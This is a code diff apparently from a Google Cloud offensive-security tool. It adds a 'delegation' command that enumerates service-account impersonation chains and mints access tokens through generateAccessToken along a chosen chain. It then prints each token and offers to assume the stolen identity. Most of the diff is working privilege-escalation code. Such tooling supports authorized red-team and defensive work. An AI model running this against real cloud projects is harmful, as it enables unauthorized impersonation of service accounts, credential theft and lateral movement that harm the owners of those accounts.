@@ -458,6 +458,7 @@ class CommandProcessor:
         "configs",
         "global_configs",
         "workspace",
+        "delegation",
     )
     CONFIG_COMMAND_NAMES = ("configs", "global_configs")
     CREDS_SUBCOMMANDS = ["list", "info", "tokeninfo", "set", "add", "update", "swap"]
@@ -495,6 +496,7 @@ class CommandProcessor:
             "folders": lambda *_args: self.print_gcp_hierarchy(focus_types=self.TREE_FOCUS_TYPES["folders"]),
             "orgs": lambda *_args: self._print_orgs_with_workspace(),
             "global_configs": self.process_configs_command,
+            "delegation": self.process_delegation_command,
             "gcloud": self.run_passthrough_command,
             "bq": self.run_passthrough_command,
             "gsutil": self.run_passthrough_command,
@@ -506,6 +508,7 @@ class CommandProcessor:
 
         self.setup_parsers()
         self.setup_folder_structure()
+        self.DELEGATION_SUBCOMMANDS = ["list", "routes", "explore"]
 
     # -----------------------------
     # Readline completion
@@ -545,7 +548,10 @@ class CommandProcessor:
             "configs": self.CONFIGS_SUBCOMMANDS,
             "global_configs": self.CONFIGS_SUBCOMMANDS,
             "workspace": self.WORKSPACE_SUBCOMMANDS,
+            "delegation": self.DELEGATION_SUBCOMMANDS,
         }
+        if command_name not in base_subcommands:
+            return []
         basic = self._complete_simple_subcommands(args, trailing_space, base_subcommands[command_name])
         if basic:
             return basic
@@ -835,6 +841,7 @@ class CommandProcessor:
         self.setup_projects_parsers()
         self.setup_workspace_tenant_parsers()
         self.setup_tree_parsers()
+        self.setup_delegation_parsers()
 
     # -----------------------------
     # Creds parsers
@@ -1018,6 +1025,27 @@ class CommandProcessor:
             sub = parser.add_subparsers(dest=dest)
             sub.add_parser("list")
 
+    # -----------------------------
+    # Delegation parsers
+    # -----------------------------
+
+    def setup_delegation_parsers(self):
+        delegation = self.subparsers.add_parser("delegation")
+        sub = delegation.add_subparsers(dest="delegation_subcommand")
+
+        sub.add_parser("list", help="Show all delegation routes across all service accounts")
+
+        routes_cmd = sub.add_parser("routes", help="Find delegation routes ending at a specific SA")
+        routes_cmd.add_argument("--target", required=False, help="Target SA email (interactive picker if omitted)")
+
+        explore_cmd = sub.add_parser("explore", help="Step through delegation interactively from a starting SA")
+        explore_cmd.add_argument("--start", required=False, help="Starting SA email (interactive picker if omitted)")
+        explore_cmd.add_argument("-v", "--debug", action="store_true", required=False, help="Verbose output")
+
+    # -----------------------------
+    # Passthrough parsers
+    # -----------------------------
+
     def setup_passthrough_parsers(self):
         for command_name in self.PASSTHROUGH_COMMANDS:
             parser = self.subparsers.add_parser(command_name)
@@ -1036,6 +1064,186 @@ class CommandProcessor:
                 f"{UtilityTools.RED}{UtilityTools.BOLD}[X] Failed to run `{command_name}`:{UtilityTools.RESET} "
                 f"{type(exc).__name__}: {exc}"
             )
+
+    # -----------------------------
+    # Delegation command
+    # -----------------------------
+
+    def process_delegation_command(self, args):
+        from gcpwn.modules.gcp.iam.utilities.helpers import (
+            delegation_find_next_hop,
+            delegation_find_routes,
+            delegation_get_all_routes,
+            delegation_create_chain,
+            _delegation_load_role_categories,
+            _delegation_rows_by_member,
+        )
+        from gcpwn.modules.gcp.iam.utilities.helpers import (
+            iam_credentials_v1,
+            iam_generate_access_token,
+        )
+        from gcpwn.core.utils.module_helpers import (
+            extract_service_account_email,
+            extract_service_account_project,
+            extract_path_tail,
+        )
+        from gcpwn.core.utils.action_recording import record_permissions
+        from gcpwn.core.utils.exploit_helpers import print_token_result
+        from datetime import datetime
+
+        sub = getattr(args, "delegation_subcommand", None)
+
+        if sub == "list":
+            access_token_routes, impersonation_routes = delegation_get_all_routes(self.session)
+            if not access_token_routes and not impersonation_routes:
+                print("[X] No delegation routes found. Run `modules run enum_iam --service-accounts --policy-bindings` first.")
+                return
+            if access_token_routes:
+                print(f"\n{UtilityTools.BOLD}[*] Access Token Routes:{UtilityTools.RESET}")
+                for i, route_path in enumerate(access_token_routes, 1):
+                    print(f"  {i}. " + " -> ".join(step["printout_name"] for step in route_path["route"]))
+            if impersonation_routes:
+                print(f"\n{UtilityTools.BOLD}[*] Impersonation Routes:{UtilityTools.RESET}")
+                for i, route_path in enumerate(impersonation_routes, 1):
+                    print(f"  {i}. " + " -> ".join(step["printout_name"] for step in route_path["route"]))
+
+        elif sub == "routes":
+            if args.target:
+                final_member = args.target
+            else:
+                final_member = self.session.choose_member(type_of_member="service_accounts")
+                if not final_member:
+                    return
+
+            access_token_routes, impersonation_routes = delegation_get_all_routes(self.session, final_member=final_member)
+
+            if not access_token_routes and not impersonation_routes:
+                print(f"[X] No delegation routes found leading to {final_member}.")
+                return
+
+            for route_path in access_token_routes:
+                route_path["display_name"] = "\n    ".join(step["printout_name"] for step in route_path["route"])
+            impersonation_options = ["\n    ".join(step["printout_name"] for step in r["route"]) for r in impersonation_routes]
+
+            choice = self.session.choice_selector(
+                access_token_routes,
+                "Choose a delegation path to attempt token generation",
+                footer_title="Impersonation routes (shown for reference — cannot generate token at these endpoints):",
+                footer_list=impersonation_options,
+                fields=["display_name"],
+            )
+            if choice == "Exit":
+                return
+
+            iam_client = iam_credentials_v1.IAMCredentialsClient(credentials=self.session.credentials)
+            target_account, delegation_chain = delegation_create_chain(choice)
+            access_token = iam_generate_access_token(iam_client, target_account.strip(), delegation=delegation_chain)
+
+            if access_token:
+                action_dict = {}
+                _proj = extract_service_account_project(target_account) or self.session.project_id or "Unknown"
+                _email = extract_service_account_email(target_account) or str(target_account)
+                record_permissions(action_dict, permissions="iam.serviceAccounts.getAccessToken", project_id=_proj, resource_type="service account", resource_label=_email)
+                record_permissions(action_dict, permissions="iam.serviceAccounts.implicitDelegation", project_id=_proj, resource_type="service account", resource_label=_email)
+                self.session.insert_actions(action_dict, column_name="service_account_actions_allowed")
+
+                token = access_token.access_token
+                print_token_result(_email, token, source="generateAccessToken")
+                print("[!] No automatic cleanup: access tokens expire naturally.")
+
+                assume = self.session.choice_prompt("Do you want to assume the new credentials? [y/n]")
+                if str(assume or "").strip().lower() == "y":
+                    ts = datetime.now().strftime("%m%d%Y_%H%M_UTC")
+                    self.session.add_oauth2_account(_email + "_" + ts, token=token, project_id=self.session.project_id, email=_email, assume=True)
+
+        elif sub == "explore":
+            debug = getattr(args, "debug", False)
+
+            if args.start:
+                starting_member = args.start
+            else:
+                starting_member = self.session.choose_member(type_of_member="service_accounts")
+                if not starting_member:
+                    return
+
+            delegation_chain = [f"projects/-/serviceAccounts/{starting_member.split(':')[-1]}"]
+            target_account = None
+            rows_by_member = _delegation_rows_by_member(self.session, type_of_asset="saaccounts")
+
+            for _ in range(1000):
+                next_hops = delegation_find_next_hop(self.session, starting_member, rows_by_member=rows_by_member)
+                if not next_hops:
+                    print("[X] No further delegation paths from this SA.")
+                    break
+
+                access_token_routes = [h for h in next_hops if h["printout_name"].startswith("(ACCESS TOKEN)")]
+                impersonation_routes = [h for h in next_hops if h["printout_name"].startswith("(IMPERSONATE)")]
+
+                data = [
+                    {"title": "End delegation chain — choose an access token path:", "data_values": access_token_routes},
+                    {"title": "Continue delegation chain — choose a hop:", "data_values": impersonation_routes},
+                ]
+
+                choice = self.session.choice_selector(
+                    header=f"Delegation Chain So Far: {delegation_chain}",
+                    chunk_mappings=data,
+                    fields=["printout_name"],
+                )
+
+                if choice == "Exit":
+                    break
+
+                node_name = choice["name"]
+                node_printout = choice["printout_name"]
+
+                if any(node_printout == r["printout_name"] for r in access_token_routes):
+                    if node_name.startswith("serviceAccount:"):
+                        target_account = f"projects/-/serviceAccounts/{node_name.partition(':')[2]}"
+                    elif "projects/" in node_name:
+                        from gcpwn.core.utils.module_helpers import split_path_tokens
+                        parts = split_path_tokens(node_name, separator="/", drop_empty=False)
+                        if len(parts) > 1:
+                            parts[1] = "-"
+                        target_account = "/".join(parts)
+                    break
+
+                if any(node_printout == r["printout_name"] for r in impersonation_routes):
+                    if node_name.startswith("serviceAccount:"):
+                        delegation_chain.append(f"projects/-/serviceAccounts/{node_name.partition(':')[2]}")
+                        starting_member = node_name
+                    elif "projects/" in node_name:
+                        from gcpwn.core.utils.module_helpers import split_path_tokens, extract_path_tail as _ept
+                        parts = split_path_tokens(node_name, separator="/", drop_empty=False)
+                        starting_member = f"serviceAccount:{_ept(node_name)}"
+                        if len(parts) > 1:
+                            parts[1] = "-"
+                        delegation_chain.append("/".join(parts))
+
+            if target_account:
+                iam_client = iam_credentials_v1.IAMCredentialsClient(credentials=self.session.credentials)
+                access_token = iam_generate_access_token(iam_client, target_account.strip(), delegation=delegation_chain, debug=debug)
+
+                if access_token:
+                    action_dict = {}
+                    _proj = extract_service_account_project(target_account) or self.session.project_id or "Unknown"
+                    _email = extract_service_account_email(target_account) or str(target_account)
+                    record_permissions(action_dict, permissions="iam.serviceAccounts.getAccessToken", project_id=_proj, resource_type="service account", resource_label=_email)
+                    record_permissions(action_dict, permissions="iam.serviceAccounts.implicitDelegation", project_id=_proj, resource_type="service account", resource_label=_email)
+                    self.session.insert_actions(action_dict, column_name="service_account_actions_allowed")
+
+                    token = access_token.access_token
+                    print_token_result(_email, token, source="generateAccessToken")
+                    print("[!] No automatic cleanup: access tokens expire naturally.")
+
+                    assume = self.session.choice_prompt("Do you want to assume the new credentials? [y/n]")
+                    if str(assume or "").strip().lower() == "y":
+                        ts = datetime.now().strftime("%m%d%Y_%H%M_UTC")
+                        self.session.add_oauth2_account(_email + "_" + ts, token=token, project_id=self.session.project_id, email=_email, assume=True)
+        else:
+            print("Usage: delegation <list|routes|explore>")
+            print("  list              Show all delegation routes")
+            print("  routes [--target SA_EMAIL]   Find routes to a specific SA")
+            print("  explore [--start SA_EMAIL]   Step through delegation interactively")
 
     # -----------------------------
     # Hierarchy helpers
